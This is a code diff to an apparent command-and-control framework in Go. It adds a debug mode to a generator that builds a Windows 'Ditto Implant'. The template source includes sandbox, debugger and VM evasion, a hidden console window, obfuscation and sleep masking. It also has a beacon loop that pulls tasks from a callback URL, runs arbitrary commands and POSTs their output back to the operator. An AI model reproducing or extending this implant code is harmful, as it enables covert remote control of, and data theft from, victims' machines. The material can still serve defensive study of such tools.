@@ -23,6 +23,7 @@ type Options struct {
 	OS          string
 	Encrypt     bool
 	Obfuscate   bool
+	Debug       bool   // Enable debug mode (console window, verbose logging, no obfuscation)
 	Config      *core.Config
 	CallbackURL string   // Full callback URL (e.g., http://192.168.1.100:8443 or https://example.com:443)
 	Delay       int      // Beacon delay in seconds (default: 30)
@@ -93,10 +94,12 @@ func (g *Generator) Generate(opts Options) ([]byte, error) {
 		return nil, fmt.Errorf("payload generation failed: %w", err)
 	}
 	
-	// Apply obfuscation if requested
-	if opts.Obfuscate {
+	// Apply obfuscation if requested (but not in debug mode)
+	if opts.Obfuscate && !opts.Debug {
 		g.logger.Debug("Applying obfuscation")
 		payloadData = evasion.ObfuscateCode(payloadData)
+	} else if opts.Debug {
+		g.logger.Debug("Debug mode enabled - skipping obfuscation")
 	}
 	
 	// Apply encryption if requested
@@ -349,9 +352,12 @@ go 1.21
 	}
 	outputPath := filepath.Join(tmpDir, outputName)
 
-	// Build command with Windows GUI subsystem flag to hide console window
+	// Build command - conditionally hide console window based on debug flag
 	// Use -H windowsgui to compile as Windows GUI application (no console window)
-	ldflags := "-s -w -H windowsgui"
+	ldflags := "-s -w"
+	if !opts.Debug {
+		ldflags += " -H windowsgui"
+	}
 	cmd := exec.Command("go", "build", "-o", outputPath, "-ldflags", ldflags, ".")
 	cmd.Dir = tmpDir
 	
@@ -499,6 +505,7 @@ type TemplateData struct {
 	Evasion     *EvasionConfig
 	Modules     []string
 	ModuleCode  string // Embedded module code
+	Debug       bool   // Enable debug mode
 }
 
 // generateWindowsSourceFull generates full payload source with evasion and modules
@@ -533,14 +540,28 @@ var (
 )
 
 func main() {
+	{{if .Debug}}
+	// DEBUG MODE: Console window visible for troubleshooting
+	fmt.Println("[DEBUG] Ditto Implant Starting...")
+	fmt.Printf("[DEBUG] Callback URL: %s\n", callbackURL)
+	fmt.Printf("[DEBUG] Delay: %d seconds\n", delay)
+	fmt.Printf("[DEBUG] Jitter: %.2f%%\n", jitter*100)
+	{{end}}
+	
 	// Avoid detection
 	if runtime.GOOS != "windows" {
+		{{if .Debug}}
+		fmt.Println("[DEBUG] ERROR: Not running on Windows, exiting")
+		{{end}}
 		os.Exit(1)
 	}
 	
 	{{if .Evasion.EnableSandboxDetection}}
 	// Sandbox detection
 	if checkSandbox() {
+		{{if .Debug}}
+		fmt.Println("[DEBUG] Sandbox detected, exiting")
+		{{end}}
 		os.Exit(0)
 	}
 	{{end}}
@@ -548,6 +569,9 @@ func main() {
 	{{if .Evasion.EnableDebuggerCheck}}
 	// Debugger detection
 	if checkDebugger() {
+		{{if .Debug}}
+		fmt.Println("[DEBUG] Debugger detected, exiting")
+		{{end}}
 		os.Exit(0)
 	}
 	{{end}}
@@ -555,14 +579,24 @@ func main() {
 	{{if .Evasion.EnableVMDetection}}
 	// VM detection
 	if checkVM() {
+		{{if .Debug}}
+		fmt.Println("[DEBUG] VM detected, exiting")
+		{{end}}
 		os.Exit(0)
 	}
+	{{end}}
+	
+	{{if .Debug}}
+	fmt.Println("[DEBUG] Starting beacon loop...")
 	{{end}}
 	
 	// Beacon loop with jitter
 	for {
 		beacon()
 		sleepDuration := time.Duration(float64(delay) * (1.0 + jitter*(rand.Float64()*2.0-1.0))) * time.Second
+		{{if .Debug}}
+		fmt.Printf("[DEBUG] Sleeping for %v before next beacon\n", sleepDuration)
+		{{end}}
 		{{if .Evasion.SleepMask}}
 		// Sleep mask evasion
 		sleepMask(sleepDuration)
@@ -666,12 +700,19 @@ func sleepMask(duration time.Duration) {
 {{end}}
 
 func beacon() {
+	{{if .Debug}}
+	fmt.Println("[DEBUG] Sending beacon request...")
+	{{end}}
+	
 	client := &http.Client{
 		Timeout: 10 * time.Second,
 	}
 	
 	req, err := http.NewRequest("GET", callbackURL+"/beacon", nil)
 	if err != nil {
+		{{if .Debug}}
+		fmt.Printf("[DEBUG] ERROR: Failed to create beacon request: %v\n", err)
+		{{end}}
 		return
 	}
 	
@@ -681,36 +722,66 @@ func beacon() {
 	sessionMu.Lock()
 	if sessionID != "" {
 		req.Header.Set("X-Session-ID", sessionID)
+		{{if .Debug}}
+		fmt.Printf("[DEBUG] Sending session ID: %s\n", sessionID)
+		{{end}}
+	} else {
+		{{if .Debug}}
+		fmt.Println("[DEBUG] No session ID yet (first beacon)")
+		{{end}}
 	}
 	sessionMu.Unlock()
 	
 	resp, err := client.Do(req)
 	if err != nil {
+		{{if .Debug}}
+		fmt.Printf("[DEBUG] ERROR: Beacon request failed: %v\n", err)
+		{{end}}
 		return
 	}
 	defer resp.Body.Close()
+	
+	{{if .Debug}}
+	fmt.Printf("[DEBUG] Beacon response status: %d\n", resp.StatusCode)
+	{{end}}
 	
 	// Handle commands
 	if resp.StatusCode == 200 {
 		var response map[string]interface{}
 		if err := json.NewDecoder(resp.Body).Decode(&response); err != nil {
+			{{if .Debug}}
+			fmt.Printf("[DEBUG] ERROR: Failed to decode response: %v\n", err)
+			{{end}}
 			return
 		}
 		
 		// Store session ID from response
 		if sid, ok := response["session_id"].(string); ok && sid != "" {
 			sessionMu.Lock()
+			oldSessionID := sessionID
 			sessionID = sid
 			sessionMu.Unlock()
+			{{if .Debug}}
+			if oldSessionID != sid {
+				fmt.Printf("[DEBUG] Received new session ID: %s\n", sid)
+			}
+			{{end}}
 		}
 		
 		if tasks, ok := response["tasks"].([]interface{}); ok {
+			{{if .Debug}}
+			fmt.Printf("[DEBUG] Received %d tasks\n", len(tasks))
+			{{end}}
 			for _, task := range tasks {
 				if taskMap, ok := task.(map[string]interface{}); ok {
 					executeTask(taskMap)
 				}
 			}
 		}
+	} else {
+		{{if .Debug}}
+		fmt.Printf("[DEBUG] Beacon returned non-200 status: %d\n", resp.StatusCode)
+		{{end}}
 	}
 }
 
@@ -769,10 +840,17 @@ func executeModule(moduleID string, task map[string]interface{}) {
 }
 
 func executeCommand(cmd string) string {
+	{{if .Debug}}
+	fmt.Printf("[DEBUG] Executing command: %s\n", cmd)
+	{{end}}
+	
 	// Execute command via os/exec
 	var result string
 	parts := strings.Fields(cmd)
 	if len(parts) == 0 {
+		{{if .Debug}}
+		fmt.Println("[DEBUG] ERROR: Empty command")
+		{{end}}
 		return ""
 	}
 	
@@ -780,8 +858,14 @@ func executeCommand(cmd string) string {
 	output, err := execCmd.CombinedOutput()
 	if err != nil {
 		result = fmt.Sprintf("Error: %v\nOutput: %s", err, string(output))
+		{{if .Debug}}
+		fmt.Printf("[DEBUG] Command error: %v\n", err)
+		{{end}}
 	} else {
 		result = string(output)
+		{{if .Debug}}
+		fmt.Printf("[DEBUG] Command output length: %d bytes\n", len(result))
+		{{end}}
 	}
 	return result
 }
@@ -811,14 +895,32 @@ func uploadFile(path, data string) {
 }
 
 func sendResult(taskType, taskID, result string) {
+	{{if .Debug}}
+	fmt.Printf("[DEBUG] Sending result for task: %s (type: %s)\n", taskID, taskType)
+	{{end}}
+	
 	client := &http.Client{Timeout: 10 * time.Second}
 	payload := map[string]interface{}{
 		"type":     taskType,
 		"task_id":  taskID,
 		"result":   result,
 	}
-	jsonData, _ := json.Marshal(payload)
-	req, _ := http.NewRequest("POST", callbackURL+"/result", bytes.NewReader(jsonData))
+	jsonData, err := json.Marshal(payload)
+	if err != nil {
+		{{if .Debug}}
+		fmt.Printf("[DEBUG] ERROR: Failed to marshal result: %v\n", err)
+		{{end}}
+		return
+	}
+	
+	req, err := http.NewRequest("POST", callbackURL+"/result", bytes.NewReader(jsonData))
+	if err != nil {
+		{{if .Debug}}
+		fmt.Printf("[DEBUG] ERROR: Failed to create result request: %v\n", err)
+		{{end}}
+		return
+	}
+	
 	req.Header.Set("User-Agent", userAgent)
 	req.Header.Set("Content-Type", "application/json")
 	
@@ -829,7 +931,18 @@ func sendResult(taskType, taskID, result string) {
 	}
 	sessionMu.Unlock()
 	
-	client.Do(req)
+	resp, err := client.Do(req)
+	if err != nil {
+		{{if .Debug}}
+		fmt.Printf("[DEBUG] ERROR: Failed to send result: %v\n", err)
+		{{end}}
+		return
+	}
+	defer resp.Body.Close()
+	
+	{{if .Debug}}
+	fmt.Printf("[DEBUG] Result sent successfully (status: %d)\n", resp.StatusCode)
+	{{end}}
 }
 `
 	
@@ -854,6 +967,7 @@ func sendResult(taskType, taskID, result string) {
 		Evasion:     evasion,
 		Modules:     opts.Modules,
 		ModuleCode:  moduleCode,
+		Debug:       opts.Debug,
 	}
 	
 	var buf bytes.Buffer
